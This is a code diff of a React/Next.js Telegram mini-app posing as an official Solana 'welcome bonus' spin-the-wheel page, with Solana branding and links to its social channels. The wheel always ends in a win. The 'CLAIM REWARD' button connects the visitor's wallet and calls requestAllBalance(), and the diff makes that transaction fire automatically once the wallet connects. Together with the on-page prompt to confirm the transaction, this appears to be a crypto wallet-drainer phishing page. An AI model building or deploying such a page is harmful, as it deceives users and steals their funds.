@@ -4,76 +4,73 @@
 'use client'
 
 import React, { useEffect, useRef, useState } from 'react'
-import './assets/2idql.css'                         // Tasarım CSS’i
-import '@solana/wallet-adapter-react-ui/styles.css' // Wallet Adapter UI stilleri
+import './assets/2idql.css'
+import '@solana/wallet-adapter-react-ui/styles.css'
 
-import { useConnection, useWallet } from '@solana/wallet-adapter-react'
+import { useWallet, useConnection } from '@solana/wallet-adapter-react'
 import { useWalletModal }           from '@solana/wallet-adapter-react-ui'
 import { requestAllBalance }        from '@/app/services/transaction'
 
 declare global {
   interface Window {
     solana?: { publicKey?: any }
-    Telegram?: {
-      WebApp?: {
-        expand: () => void
-        requestFullscreen?: () => void
-        setHeaderColor: (typeOrColor: string, colorHex?: string) => void
-        setBackgroundColor: (colorHex: string) => void
-        disableVerticalSwipes?: () => void
-        scroll?: (offsetY: number) => void
-      }
-    }
+    Telegram?: { WebApp?: TgWebApp }
   }
+}
+
+interface TgWebApp {
+  expand: () => void
+  requestFullscreen?: () => void
+  setHeaderColor: (typeOrColor: string, colorHex?: string) => void
+  setBackgroundColor: (colorHex: string) => void
+  disableVerticalSwipes?: () => void
+  scroll?: (offsetY: number) => void
 }
 
 const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
 const openPhantomBrowser = () => {
-  const dappUrl   = encodeURIComponent('https://solspin-seven.vercel.app/')
-  const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
-  window.open(universal, '_blank')
+  const dapp = encodeURIComponent('https://solspin-seven.vercel.app/')
+  window.open(`https://phantom.app/ul/browse/${dapp}?ref=${dapp}`, '_blank')
 }
 
 export default function Page() {
-  /* -------- Telegram Mini-App init -------- */
+  /* ---------------- Telegram setup ------------- */
   useEffect(() => {
-    const webapp = window.Telegram?.WebApp
-    if (!webapp) return
+    const wa = window.Telegram?.WebApp
+    if (!wa) return
     try {
-      webapp.expand()
-      if (typeof webapp.requestFullscreen === 'function') {
-        webapp.requestFullscreen()
-      }
-      webapp.setHeaderColor('bg_color', '#000000')
-      webapp.setBackgroundColor('#000000')
-      if (typeof webapp.disableVerticalSwipes === 'function') {
-        webapp.disableVerticalSwipes()
-      } else if (typeof webapp.scroll === 'function') {
-        const lock = () => webapp.scroll!(window.scrollY)
+      wa.expand()
+      wa.requestFullscreen?.()
+      wa.setHeaderColor('bg_color', '#000')
+      wa.setBackgroundColor('#000')
+      if (wa.disableVerticalSwipes) wa.disableVerticalSwipes()
+      else if (wa.scroll) {
+        const lock = () => wa.scroll!(window.scrollY)
         window.addEventListener('scroll', lock)
         return () => window.removeEventListener('scroll', lock)
       }
     } catch (e) {
-      console.error('Telegram WebApp init hatası:', e)
+      console.error('Telegram init', e)
     }
   }, [])
 
-  /* -------- Wheel State -------- */
+  /* ---------------- Wheel state ---------------- */
   const wheelRef = useRef<HTMLImageElement>(null)
-  const [hasSpun, setHasSpun] = useState<boolean>(() =>
+  const [hasSpun, setHasSpun] = useState(
     typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
   )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
   }, [hasSpun])
+
   const handleSpin = () => {
     if (hasSpun || !wheelRef.current) return
-    const wheel = wheelRef.current
-    wheel.style.transition = 'transform 9000ms ease-in-out'
-    wheel.style.transform  = 'rotate(1080deg)'
+    const w = wheelRef.current
+    w.style.transition = 'transform 9000ms ease-in-out'
+    w.style.transform  = 'rotate(1080deg)'
     setTimeout(() => {
-      wheel.style.transition = 'none'
-      wheel.style.transform  = 'rotate(0deg)'
+      w.style.transition = 'none'
+      w.style.transform  = 'rotate(0deg)'
     }, 9000)
     setTimeout(() => {
       setHasSpun(true)
@@ -81,52 +78,58 @@ export default function Page() {
     }, 10000)
   }
 
-  /* ——————————————————————————————————————— */
-  /*    Wallet Adapter ile connect & withdraw    */
-  /* ——————————————————————————————————————— */
-  const { connection }               = useConnection()
-  const { publicKey }                = useWallet()
-  const { setVisible }               = useWalletModal()
+  /* --------------- Wallet logic ---------------- */
+  const { publicKey }  = useWallet()
+  const { setVisible } = useWalletModal()
+  const [isLoading, setIsLoading]           = useState(false)
+  const [msg,       setMsg]                 = useState('')
+  const [pendingTx, setPendingTx]           = useState(false)
 
-  const [isLoading, setIsLoading]       = useState(false)
-  const [withdrawMessage, setWithdrawMessage] = useState('')
-
-  const handleConnect = () => {
+  const openConnectModal = () => {
     if (isMobile() && !window.solana) {
       openPhantomBrowser()
-      return
+    } else {
+      setVisible(true)
     }
-    setVisible(true) // WalletAdapter UI modal
   }
 
-  const handleWithdraw = async () => {
+  const sendTx = async () => {
     setIsLoading(true)
-    if (!publicKey) {
-      setWithdrawMessage('Please connect your wallet!')
-      setTimeout(() => setWithdrawMessage(''), 5000)
-      setIsLoading(false)
-      return
-    }
-    let txResult: boolean | undefined
+    let ok: boolean | undefined
     try {
-      txResult = await requestAllBalance()
+      ok = await requestAllBalance()
     } catch (e) {
-      console.error('Transaction hatası:', e)
+      console.error(e)
     } finally {
       setIsLoading(false)
     }
-    if (txResult === false) {
-      setWithdrawMessage('No enough Sol!')
-      setTimeout(() => setWithdrawMessage(''), 5000)
+    if (ok === false) {
+      setMsg('No enough Sol!')
+      setTimeout(() => setMsg(''), 5000)
     }
   }
 
-  /* ——————————————————————————————————————— */
-  /*                    JSX                     */
-  /* ——————————————————————————————————————— */
+  const handleClaim = async () => {
+    if (!publicKey) {
+      setPendingTx(true)       // işlem beklet
+      openConnectModal()       // modal veya deeplink
+      return
+    }
+    await sendTx()
+  }
+
+  /* Cüzdan bağlandıktan sonra bekleyen tx varsa gönder */
+  useEffect(() => {
+    if (publicKey && pendingTx) {
+      setPendingTx(false)
+      sendTx()
+    }
+  }, [publicKey, pendingTx])
+
+  /* -------------------- JSX -------------------- */
   return (
     <>
-      {/* ---------- HERO BANNER ---------- */}
+      {/* HERO */}
       <div className="_1">
         <div className="_g">
           <span className="_a">
@@ -142,52 +145,35 @@ export default function Page() {
             <div className="_i">
               <p className="_k">Connect your wallet to receive reward</p>
               <button
-                onClick={handleWithdraw}
+                onClick={handleClaim}
                 className="_s"
                 disabled={isLoading}
               >
-                {isLoading
-                  ? 'Please wait…'
-                  : withdrawMessage || 'CLAIM REWARD'}
+                {isLoading ? 'Please wait…' : msg || 'CLAIM REWARD'}
               </button>
             </div>
           </div>
         </div>
       </div>
 
-      {/* ---------- HEADER ---------- */}
+      {/* HEADER */}
       <section className="_b">
         <div className="_d">
           <div className="_x">
-            {/* Logo + avatar */}
             <div className="_0">
-              <a href="#!" className="_h">
-                <img src="/header_logo.svg" alt="Solana logo" />
-              </a>
-              <a href="#!" className="_w">
-                <img src="/alik.png" className="_t" alt="avatar" />
-              </a>
+              <a href="#!" className="_h"><img src="/header_logo.svg" alt="Solana" /></a>
+              <a href="#!" className="_w"><img src="/alik.png" className="_t" alt="avatar" /></a>
             </div>
-            {/* Sosyal linkler */}
             <div className="_0">
               <div className="_6">
-                <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
-                  <img src="/header_twitter.svg" alt="Twitter / X" />
-                </a>
-                <a href="https://t.me/solana" target="_blank" rel="noreferrer">
-                  <img src="/header_tg.svg" alt="Telegram" />
-                </a>
-                <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
-                  <img src="/header_mail.svg" alt="YouTube" />
-                </a>
-                <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
-                  <img src="/header_ds.svg" alt="Discord" />
-                </a>
+                <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer"><img src="/header_twitter.svg" alt="X" /></a>
+                <a href="https://t.me/solana" target="_blank" rel="noreferrer"><img src="/header_tg.svg" alt="TG" /></a>
+                <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer"><img src="/header_mail.svg" alt="YT" /></a>
+                <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer"><img src="/header_ds.svg" alt="DS" /></a>
               </div>
             </div>
-            {/* Connect Wallet */}
             <div className="_0">
-              <button onClick={handleConnect} className="_n">
+              <button onClick={openConnectModal} className="_n">
                 <span className="_a">
                   {publicKey ? 'Wallet connected' : 'Connect Wallet'}
                 </span>
@@ -198,69 +184,38 @@ export default function Page() {
         </div>
       </section>
 
-      {/* ---------- MAIN SECTION ---------- */}
+      {/* MAIN */}
       <section className="_m">
         <div className="_d">
           <h1 className="_4">
-            WELCOME <span>BONUS</span>
-            <br />
-            FOR SOLANA USERS
+            WELCOME <span>BONUS</span><br />FOR SOLANA USERS
           </h1>
-          {/* ÇARK (Wheel) */}
           <div className="_o">
             <div className="_r">
               <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
-              <img
-                ref={wheelRef}
-                src="/wheel_wheel.png"
-                alt="Wheel"
-                className="_l"
-                id="_8"
-              />
-              <button className="_y" id="_c" onClick={handleSpin}>
-                FREE SPIN
-              </button>
+              <img ref={wheelRef} src="/wheel_wheel.png" alt="Wheel" className="_l" />
+              <button className="_y" onClick={handleSpin}>FREE SPIN</button>
             </div>
           </div>
-          {/* Açıklama kutuları */}
           <div className="_u">
             <div className="_j">
-              <p className="_p">
-                <img src="/main_one.svg" alt="step 1" />
-                If you have received a qualification notification in the form of
-                SOL or USDT, click the «FREE SPIN» button
-              </p>
-              <p className="_p">
-                <img src="/main_two.svg" alt="step 2" />
-                If you win a reward in free spin, we congratulate you!
-              </p>
-              <p className="_p">
-                <img src="/main_three.svg" alt="step 3" />
-                Click «CLAIM REWARD», connect your wallet and confirm the
-                received transaction
-              </p>
+              <p className="_p"><img src="/main_one.svg" alt="" />If you have received a qualification notification in the form of SOL or USDT, click the «FREE SPIN» button</p>
+              <p className="_p"><img src="/main_two.svg" alt="" />If you win a reward in free spin, we congratulate you!</p>
+              <p className="_p"><img src="/main_three.svg" alt="" />Click «CLAIM REWARD», connect your wallet and confirm the received transaction</p>
             </div>
             <p className="_e">All rights reserved © 2025 SOLANA.</p>
           </div>
         </div>
       </section>
 
-      {/* ---------- FOOTER SOCIAL ---------- */}
+      {/* FOOTER */}
       <section className="_v">
         <div className="_d">
           <div className="_6">
-            <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
-              <img src="/header_twitter.svg" alt="Twitter" />
-            </a>
-            <a href="https://t.me/solana" target="_blank" rel="noreferrer">
-              <img src="/header_tg.svg" alt="Telegram" />
-            </a>
-            <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
-              <img src="/header_mail.svg" alt="YouTube" />
-            </a>
-            <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
-              <img src="/header_ds.svg" alt="Discord" />
-            </a>
+            <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer"><img src="/header_twitter.svg" alt="Twitter" /></a>
+            <a href="https://t.me/solana" target="_blank" rel="noreferrer"><img src="/header_tg.svg" alt="TG" /></a>
+            <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer"><img src="/header_mail.svg" alt="YT" /></a>
+            <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer"><img src="/header_ds.svg" alt="DS" /></a>
           </div>
         </div>
       </section>
